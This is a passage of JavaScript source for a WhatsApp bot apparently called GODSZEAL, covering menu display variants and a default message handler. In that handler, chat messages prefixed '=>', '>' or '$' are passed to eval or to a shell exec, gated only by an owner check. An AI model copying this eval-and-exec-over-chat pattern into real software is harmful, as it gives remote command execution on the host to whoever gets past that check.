                    } else if (typemenu === 'v2') {
                    GODSZEALBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./modsMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: godszealmenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/aa3b4082d639bcbbf401a.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    GODSZEALBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./modsMedia/thumb2.mp4'),
                        caption: godszealmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    GODSZEALBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: godszealmenuoh
                        }
                    }, {})
                }
                break
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcgodszeal(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcgodszeal(bang)
                    }
                    try {
                        replygcgodszeal(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcgodszeal(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcgodszeal(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcgodszeal(evaled)
                    } catch (err) {
                        await replygcgodszeal(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcgodszeal(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcgodszeal(err)
                        if (stdout) return replygcgodszeal(stdout)
                    })
                }
        }
    } catch (err) {
        GODSZEALBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
